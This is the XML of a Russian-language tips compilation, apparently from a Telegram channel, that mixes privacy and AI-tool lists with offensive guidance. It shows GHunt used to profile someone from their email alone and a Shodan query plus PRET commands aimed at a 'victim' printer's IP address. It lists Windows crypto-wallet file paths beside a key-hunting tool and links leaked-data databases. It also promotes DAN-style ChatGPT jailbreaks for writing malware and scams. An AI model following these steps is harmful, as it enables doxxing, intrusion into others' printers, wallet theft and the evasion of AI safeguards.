      <text:p text:style-name="P1"><text:span text:style-name="T3">Сегодня я хочу показать вам крутой инструмент по сбору информации из почты. Использовать мы будем старый добрый </text:span><text:span text:style-name="T2">Termux</text:span><text:span text:style-name="T3">. Вот такие данные можно получить, имея только почту:</text:span></text:p>
      <text:p text:style-name="P2">- Имя владельца</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">- </text:span><text:span text:style-name="T2">Google</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">ID</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">- Активированные сервисы </text:span><text:span text:style-name="T2">Google</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">- Возможный канал </text:span><text:span text:style-name="T2">YouTube</text:span></text:p>
      <text:p text:style-name="P2">- Возможные имена</text:p>
      <text:p text:style-name="P2">- Публичные фотографии </text:p>
      <text:p text:style-name="P2">- Модели телефонов <text:s/></text:p>
      <text:p text:style-name="P2">- Установленное программное обеспечение</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">- Отзывы о </text:span><text:span text:style-name="T2">Google</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Maps</text:span></text:p>
      <text:p text:style-name="P2">- Возможное физическое местоположение</text:p>
      <text:p text:style-name="P2">Установка:</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">$ </text:span><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mxrch</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">GHunt</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ pip3 install -r requirements.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">$ python check_and_gen.py</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2">Использование:</text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">$ </text:span><text:span text:style-name="T2">python</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">hunt</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">py</text:span><text:span text:style-name="T3"> ПРИМЕР@</text:span><text:span text:style-name="T2">gmail</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">#</text:span><text:span text:style-name="T2">Termux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Как проверить на уязвимость сой принтер с помощью </text:span><text:span text:style-name="T2">Termux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Вы когда-нибудь задумывались, зачем хакеры проводят атаки на принтеры? Дело в том, что принтеры могут раскрыть гораздо больше информации, чем кажется. Целью атаки может быть память </text:span><text:span text:style-name="T2">NVRAM</text:span><text:span text:style-name="T3"> устройства, в котором могут находиться данные для входа (пароль). Кроме того, таким образом можно получить доступ к файловой системе, в которой находятся файлы конфигурации и данные аутентификации аккаунтов. Это лишь основные причины взлома таких информационных носителей, но на самом деле их гораздо больше. Установка:</text:span></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RUB</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">NDS</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">PRET</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">cd PRET</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P17" loext:marker-style-name="T1"><text:span text:style-name="T2">pip install colorama pysnmP</text:span></text:p>
      <text:p text:style-name="P17" loext:marker-style-name="T1"><text:span text:style-name="T3">Использование:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Теперь переходим на сайт </text:span><text:span text:style-name="T2">Shodan</text:span><text:span text:style-name="T3"> и в строке поиска вводим запрос:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">▫</text:span><text:span text:style-name="T2">️port</text:span><text:span text:style-name="T3">:9100 </text:span><text:span text:style-name="T2">pjl</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Выбираем нужный нам </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3"> принтера, переходим обратно в терминал и прописываем:</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">▫</text:span><text:span text:style-name="T2">️python</text:span><text:span text:style-name="T3">2 </text:span><text:span text:style-name="T2">pret</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">py</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3"> адрес жертвы) </text:span><text:span text:style-name="T2">pjl</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Подборка </text:span><text:span text:style-name="T2">OSINT</text:span><text:span text:style-name="T3"> инструментов. Часть 21. Крипта. [4]:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">breadcrumbs</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">breadcrumbs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3">/) - визуализатор транзакций + исследовательский инструмент с неплохим, но платным функционалом. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">Walletexplorer</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">walletexplorer</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/) - устанавливает связи ВТС адреса с различными крипто-сервисами и проверяет баланс. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">3. </text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">my</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">btc</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">wallet</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">gabcvit</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">find</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">my</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">btc</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">wallet</text:span><text:span text:style-name="T3">) - софт, который ищет ВТС-кошельки и приватные ключи на запускаемом компьютере. </text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T3">5. </text:span><text:span text:style-name="T2">YouTube</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Comments</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Finder</text:span><text:span text:style-name="T3"> <text:s/>(</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">ytcomment</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">kmcat</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">uk</text:span><text:span text:style-name="T3">/) - поиск по комментарием </text:span><text:span text:style-name="T2">YouTube</text:span><text:span text:style-name="T3">, можно использовать для поиска криптовалютных адресов. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Где находятся файлы кошельков в </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T3">? </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Armory: %appdata%\Armory (.wallet)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Bitcoin Unlimited/Classic/XT/Core: %appdata%\Bitcoin (wallet.dat)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">Bither: ‘%appdata%\Bither’ (address.db)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Blockchain: (wallet.aes.json)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">MultiBit HD: %appdata%\MultiBitHD (mbhd.wallet.aes)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Electrum: %appdata%\Electrum\wallets</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">mSIGNA: %homedrive%%homepath% (.vault)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Прощаемся</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">рекламой</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">везде</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">навсегда</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2">1. Браузерные расширения </text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">uBlock</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Origin</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">AdBlock (https://adblockplus.org/)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Do Not Track Me</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">AdGuard (https://addons.mozilla.org/ru/firefox/addon/adguard-adblocker/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">YouTube</text:span><text:span text:style-name="T3"> без рекламы</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">NewPipe</text:span><text:span text:style-name="T3"> (клиент)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">SkyTube (https://skytube-app.com/)(клиент)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">SponsorBlock (аддон)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Invidious (клиент)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Adblock for Youtube (https://chrome.google.com/webstore/detail/adblock-for-youtube/cmedhionkhpnakcndndgjdbohmhepckk?hl=ru) (аддон)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Piped</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">TeamPiped</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">Piped</text:span><text:span text:style-name="T3">) (клиент)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">3. Файл </text:span><text:span text:style-name="T2">hosts</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3"> блокировкой рекламы и трекеров</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Hosts (https://github.com/lightswitch05/hosts)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P25" loext:marker-style-name="T1"><text:span text:style-name="T2">hosts-blocklists (https://github.com/notracking/hosts-blocklists) </text:span><text:span text:style-name="T3">+еще варианты (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">search</text:span><text:span text:style-name="T3">?</text:span><text:span text:style-name="T2">p</text:span><text:span text:style-name="T3">=2&amp;</text:span><text:span text:style-name="T2">q</text:span><text:span text:style-name="T3">=</text:span><text:span text:style-name="T2">hosts</text:span><text:span text:style-name="T3">+</text:span><text:span text:style-name="T2">domain</text:span><text:span text:style-name="T3">+</text:span><text:span text:style-name="T2">blocking</text:span><text:span text:style-name="T3">&amp;</text:span><text:span text:style-name="T2">type</text:span><text:span text:style-name="T3">=</text:span><text:span text:style-name="T2">Repositories</text:span><text:span text:style-name="T3">)</text:span></text:p>
      <text:p text:style-name="P25" loext:marker-style-name="T1"><text:span text:style-name="T3">4. Мобильные приложения</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Android</text:span><text:span text:style-name="T3">: </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">1. Находим в настройках «Подключения», далее «Настройка </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3">», выбираем частный </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3"> сервер и устанавливаем </text:span><text:span text:style-name="T2">dns</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">adguard</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">2. Скачиваем </text:span><text:span text:style-name="T2">AdAway</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">AdAway</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">AdAway</text:span><text:span text:style-name="T3">), приложение для блокировки рекламы на уровне файла </text:span><text:span text:style-name="T2">hosts</text:span><text:span text:style-name="T3"> + </text:span><text:span text:style-name="T2">VPN</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">iOS</text:span><text:span text:style-name="T3">: Находим в настройках </text:span><text:span text:style-name="T2">Wi</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">Fi</text:span><text:span text:style-name="T3"> нашу сеть, выбираем её, нажимаем «Настройка </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3">», далее «Вручную» и указываем в строке сервера 94.140.14.14, в поле домена </text:span><text:span text:style-name="T2">dns</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">adguard</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">.</text:span></text:p>
      <text:p text:style-name="P2">Используем блага нейросетей. Часть 2;</text:p>
      <text:p text:style-name="P2">1. https://t.me/neuroperson_bot - бот известного проекта, генерирующего уникальные лица посредством ИИ. </text:p>
      <text:p text:style-name="P2">2. https://www.canva.com/features/ai-image-generator/ - еще один генератор изображений из текста;</text:p>
      <text:p text:style-name="P2">3. https://imaginarysoundscape2.qosmo.jp/ - озучивает картинки;</text:p>
      <text:p text:style-name="P2">4. https://www.autodraw.com/ - ИИ-рисовалка от Google;</text:p>
      <text:p text:style-name="P2">5. https://thiscatdoesnotexist.com/ - генерация морд уникальных котов!</text:p>
      <text:p text:style-name="P2">6. https://www.remove.bg/ru - удаляет фон на изображениях;</text:p>
      <text:p text:style-name="P2">7. https://yandex.ru/autopoet/onegin/27 - окрашивает черно-белые фотографии;</text:p>
      <text:p text:style-name="P2">8. http://gaugan.org/gaugan2/ - генератор ландшафтов;</text:p>
      <text:p text:style-name="P2">9. https://bigjpg.com/ - увеличивает размер изображения;</text:p>
      <text:p text:style-name="P2">10. https://www.nvidia.com/research/inpainting/index.html - неплохая нейросеть для обработки фотографий;</text:p>
      <text:p text:style-name="P2">11. https://www.chatbcg.com - создает слайды;</text:p>
      <text:p text:style-name="P2">12. https://porfirevich.ru/ - пишет истории;</text:p>
      <text:p text:style-name="P2">13. https://visper.tech/ - делает видео из текста;</text:p>
      <text:p text:style-name="P2">14. https://www.deepcode.ai/ - ищет ошибки в программном коде;</text:p>
      <text:p text:style-name="P6">15. https://dream.ai/ - еще один бесплатный генератор изображений хорошего качества.</text:p>
      <text:p text:style-name="P2">Используем блага нейросетей. Часть 3.</text:p>
      <text:p text:style-name="P2">1. https://www.lalal.ai/ - ИИ для создания треков и работы с вокалом;</text:p>
      <text:p text:style-name="P2">2. https://tosummary.com/ - делает пересказ статей, книг и даже YouTube видео;</text:p>
      <text:p text:style-name="P2">3. https://www.autoti.io/ - создает посты в Instagram;</text:p>
      <text:p text:style-name="P2">4. https://chatbotkit.com/ - позволяет создавать чат-ботов;</text:p>
      <text:p text:style-name="P2">5. https://colorize.cc/ - раскрашивает черно-белые фото;</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">6. https://aihelperbot.com/ - позволяет работать с SQL-запросами без знания баз данных;</text:span></text:p>
      <text:p text:style-name="P2">7. https://nuclia.com/ - умная поисковая система;</text:p>
      <text:p text:style-name="P2">8. https://murf.ai/ - переводит текст в аудио;</text:p>
      <text:p text:style-name="P2">9. https://debuild.app/ - помогает в написании веб-приложений;</text:p>
      <text:p text:style-name="P6">10. https://tryellie.com/ - умный почтовый ассистент.</text:p>
      <text:p text:style-name="P2">Используем блага нейросетей. Часть 4.</text:p>
      <text:p text:style-name="P2">1. https://appicons.ai/ - генерирует иконки для ваших приложений;</text:p>
      <text:p text:style-name="P26">2. https://www.scenario.gg/ - ИИ для создания игрового контента;</text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T2">3. https://leonardo.ai/ - </text:span><text:span text:style-name="T3">еще</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">один</text:span><text:span text:style-name="T2"> game assets generator;</text:span></text:p>
      <text:p text:style-name="P2">4. https://excelformulabot.com/ - переводит ваши текстовые инструкции в Excel формулы!;</text:p>
      <text:p text:style-name="P2">5. https://github.com/features/copilot - помощник программиста в реальном времени;</text:p>
      <text:p text:style-name="P2">6. https://www.sheetai.app/ - переводит ваши текстовые инструкции в формулы Google таблиц;</text:p>
      <text:p text:style-name="P2">7. https://boo.ai/ - умный помощник в написании текстов;</text:p>
      <text:p text:style-name="P2">8. https://plugins.jetbrains.com/plugin/20085-codeassist - еще один умный помощник программиста;</text:p>
      <text:p text:style-name="P2">9. https://www.playlistai.app/ - формирует плейлисты в Spotify и Apple Music;</text:p>
      <text:p text:style-name="P2">10. https://audioread.com/ - превращает текст в аудио (подкаст);</text:p>
      <text:p text:style-name="P2">11. https://www.aiphotoof.me/ - делает из ваших селфи портреты, более 100 стилей рисовки;</text:p>
      <text:p text:style-name="P2">12. https://makelogo.ai/ - рисует логотипы и иконки;</text:p>
      <text:p text:style-name="P2">13. https://wiz.chat/ - чат-бот GPT-3 для Slack;</text:p>
      <text:p text:style-name="P2">14. https://www.browse.ai/ - ИИ для парсинга и экстракции данных с сайтов;</text:p>
      <text:p text:style-name="P2">15. https://namewizard.ai/ - генерирует доменные имена;</text:p>
      <text:p text:style-name="P2">16. https://www.politepost.net/ - переделывает ваши грубые и быстро написанные письма в крайне вежливые;</text:p>
      <text:p text:style-name="P2">17. https://seo.ai/ - ваш умный SEO помощник:</text:p>
      <text:p text:style-name="P2">18. https://debuild.app/ - ИИ для создания сайтов;</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">19. https://webullar.com/ - ИИ для создания сайтов со смартфона;</text:span></text:p>
      <text:p text:style-name="P6">20. https://www.voicemod.net/ - меняет ваш голос в режиме реального времени.</text:p>
      <text:p text:style-name="P2">Небольшой OSINT:</text:p>
      <text:p text:style-name="P2">1) https://pentest-tools.com - Данный набор инструментов предназначен для проведения тестирования безопасности интернет ресурсов и выявления уязвимостей.</text:p>
      <text:p text:style-name="P2">2) https://exploit-db.com - это каталог публичных эксплойтов, шелл кодов, CVE, и соответствующего уязвимого программного обеспечения от компании Offensive Security, разработанный для использования тестировщиками на проникновение и исследователями уязвимостей.</text:p>
      <text:p text:style-name="P2">3) https://criminalip.io/ - это поисковая система, которая выполняет поиск информации о киберугрозах, использующая IP-аналитику в качестве основы для отслеживания объектов, подключенных к Интернету, а также способная обрабатывать записи об использовании IP-адресов.</text:p>
      <text:p text:style-name="P2">4) https://leakcheck.io - ресурс позволяющий выявить утечки данных в интернете по типу: логин, пароль, номер телефона, электронная почта, хэш. А также отображает с какого ресурса была произведена утечка.</text:p>
      <text:p text:style-name="P27">5) https://intelx.io/ - самый огромный каталог, когда-либо слитых данных. Ресурс содержит в себе более 100,503,980,245 записей! Работает с: публичными ресурсами, Tor, I2P, IP, CIDR, IPv4, MAC-адрес, IPFS, Hash, Биткойн транзакции, ИНН, IBAN, электронные почты, логины, пароли, кредитные карты, номера телефонов и тд.</text:p>
      <text:p text:style-name="P26">Управляем заметками и храним их в безопасном виде:</text:p>
      <text:p text:style-name="P2">1. Notesnook (https://notesnook.com/) - zero knowledge хранилище записок со сквозным шифрованием, открытым исходным кодом и установкой пароля. Платный сервис.</text:p>
      <text:p text:style-name="P2">2. Cryptee - бесплатный сервис для надежного хранения документов, файлов, фотографий и заметорк. Исходный код открыт. Регистрация анонимная.</text:p>
      <text:p text:style-name="P2">3. Standard Notes (https://standardnotes.com/) - бесплатный сервис для надежного хранения заметок, есть сквозное шифрование. </text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">4. Joplin - это бесплатное приложение для управления заметками в формате Markdown. Открытый исходный код. Есть синхронизация с DropBox и другими сервисами.</text:span></text:p>
      <text:p text:style-name="P2">5. Laverna (https://laverna.cc/) - менеджер заметок в формате Markdown, нацеленный на приватность. Поддерживает сквозное шифрование. Не требует регистрации. </text:p>
      <text:p text:style-name="P2">6. Turtl - приватный менеджер заметок с десктопными и мобильными клиентами. При регистрации программа берёт твой пароль и на его основе создаёт криптографический ключ, с помощью которого шифрует всю информацию. </text:p>
      <text:p text:style-name="P6">7. Protected Text - еще один менеджер заметок с шифрованием, бесплатный.</text:p>
      <text:p text:style-name="P2">Полезные аддоны для Mozilla Firefox:</text:p>
      <text:p text:style-name="P2">1. Don't track me Google (https://addons.mozilla.org/ru/firefox/addon/dont-track-me-google1/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search) - шифрует ваши запросы в поиске Google и не позволяет отслеживать их историю. </text:p>
      <text:p text:style-name="P2">2. SingleFile (https://addons.mozilla.org/ru/firefox/addon/single-file/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search) - скачивает веб-страницу целиком в формате HTML.</text:p>
      <text:p text:style-name="P2">3. Mailvelope (https://addons.mozilla.org/ru/firefox/addon/mailvelope/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search) - позволяет шифровать и расшифровывать сообщения электронной почты в вашем браузере непосредственно на странице веб-интерфейса почтового сервиса. <text:s/></text:p>
      <text:p text:style-name="P2">4. AdBlocker Ultimate (https://addons.mozilla.org/ru/firefox/addon/adblocker-ultimate/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search) - бесплатный блокировщик рекламы с хорошим функционалом.</text:p>
      <text:p text:style-name="P2">5. Popup Blocker (https://addons.mozilla.org/ru/firefox/addon/popup-blocker/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search) - блокирует всевозможные всплывающие окна на сайтах.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">6. Cookie-Editor (https://addons.mozilla.org/ru/firefox/addon/cookie-editor/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search) - позволяет создавать, редактировать и удалять куки-файлы для каждой отдельной вкладки. </text:span></text:p>
      <text:p text:style-name="P26">7. Proxy SwitchyOmega (https://addons.mozilla.org/ru/firefox/addon/switchyomega/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search) - позволяет управлять и переключаться между многими прокси.</text:p>
      <text:p text:style-name="P26">8. Firefox Translations (https://addons.mozilla.org/ru/firefox/addon/firefox-translations/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search) - переводит страницу на нужный вам язык целиком. </text:p>
      <text:p text:style-name="P6">10. Clear Browsing Data (https://addons.mozilla.org/ru/firefox/addon/clear-browsing-data/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search) - очищает историю, куки и кэш в один клик.</text:p>
      <text:p text:style-name="P2">Используем блага нейросетей. Часть 5.</text:p>
      <text:p text:style-name="P2">1. https://www.useblackbox.io/ - еще один помощник программиста:</text:p>
      <text:p text:style-name="P2">2. https://www.altered.ai/ - меняет голос в реальном времени;</text:p>
      <text:p text:style-name="P2">3. https://alpha.genmo.ai/ - генерирует видео из текста:</text:p>
      <text:p text:style-name="P2">4. https://www.magicslides.app/ - создает презентации;</text:p>
      <text:p text:style-name="P2">5. https://www.kinetix.tech/ - ИИ для создания 3D анимации;</text:p>
      <text:p text:style-name="P2">6. https://www.autodraw.com/ - умная рисовалка;</text:p>
      <text:p text:style-name="P2">7. https://brandmark.io/tools/ - генератор логотипов;</text:p>
      <text:p text:style-name="P2">8. https://paraphrasetool.com/ - перефразирует ваш текст на 100 языках;</text:p>
      <text:p text:style-name="P2">9. https://pictodream.com/ - для создания аватарок из фотографий;</text:p>
      <text:p text:style-name="P6">10. https://sheetplus.ai/ - переводит текст в таблицы Google Docs и Excel, помогает с формулами и т.д</text:p>
      <text:p text:style-name="P2">Cнимаем ограничения с ChatGPT3:</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Chat GPT "DAN" <text:s/>(https://gist.github.com/coolaj86/6f4f7b30129b0251f61fa7baaa881516) - набор всевозможных jailbreak-ов (DAN, STAN, DUDE, Mongo Tom), позволяющих </text:span><text:soft-page-break/><text:span text:style-name="T3">убедить чат-бота в том, что он является другой нейросетью и полностью снять с него ограничения. В частности, подойдет для написания вредоносного софта, общения на запрещенные темы (напр. о Гитлере), скама и всего, что сможет сгенерировать ваша фантазия. Материалы по теме:</text:span></text:p>
      <text:p text:style-name="P2">1. https://vc.ru/services/612914-ubral-ogranicheniya-openai-i-poprosil-chatgpt-proyti-test-na-cennostnye-orientacii</text:p>
      <text:p text:style-name="P2">2. https://vc.ru/life/601444-kak-ya-obuchil-chatgpt-russkomu-matu</text:p>
      <text:p text:style-name="P2">3. https://tech-geek.ru/chatgpt-jailbreak-dan/</text:p>
      <text:p text:style-name="P2">4. https://ask.replit.com/t/a-guide-to-dan-chatgpt-guides/10285</text:p>
      <text:p text:style-name="P6">5. https://www.reddit.com/r/ChatGPT/comments/10tevu1/new_jailbreak_proudly_unveiling_the_tried_and/</text:p>
      <text:p text:style-name="P2">Избавляемся от Google навсегда:</text:p>
      <text:p text:style-name="P26">1. Degoogle - внушительный список всевозможных альтернатив приложениям Google + пачка браузерных расширений и утилит, связанных с анонимностью и приватностью.</text:p>
      <text:p text:style-name="P26">2. Privacy Redirect - расширение, которое перенаправляет запросы к Twitter, YouTube, Instagram &amp; Google Maps на альтернативные сервисы, дружелюбные к приватности. </text:p>
      <text:p text:style-name="P2">3. No More Google (https://nomoregoogle.com/) - авторский список альтернатив Google сервисам с приятным интерфейсом и действительно достойными приложениями/cофтом. </text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Бонус</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">Awesome Privacy List - https://github.com/Lissy93/awesome-privacy</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P28"><text:span text:style-name="T3">Pastenym аналог pastebin, который позволяет вам делиться текстом просто, анонимно и конфиденциально. Системы Pastebin/Privatebin, такие как pastebin.com или privatebin.info (форк Zerobin), позволяют быстро и легко обмениваться текстом. Privatebin добавляет уровень шифрования, который гарантирует, что только отправитель и получатель имеют доступ к содержимому. Однако, при использовании этих веб-сайтов наблюдатель вполне может обнаружить действия, выполняемые пользователями, такие как получение или обмен текстом. Эта информация может быть сопоставлена с </text:span><text:soft-page-break/><text:span text:style-name="T3">информацией из других служб, таких как обмен мгновенными сообщениями или электронная почта. Это возможно, потому что метаданные в этих сервисах не защищены. Pastenym - это адаптация Privatebin использующая микснет Nym для защиты пользователей и их данных, но особенно их метаданных. Микснет позволяет, благодаря различным механизмам, защищать личность людей, когда они общаются в этой сети (подробнее https://nymtech.net/docs/stable/architecture/network-overview#overview).</text:span></text:p>
      <text:p text:style-name="P29">Сам себе почтовый провайдер:</text:p>
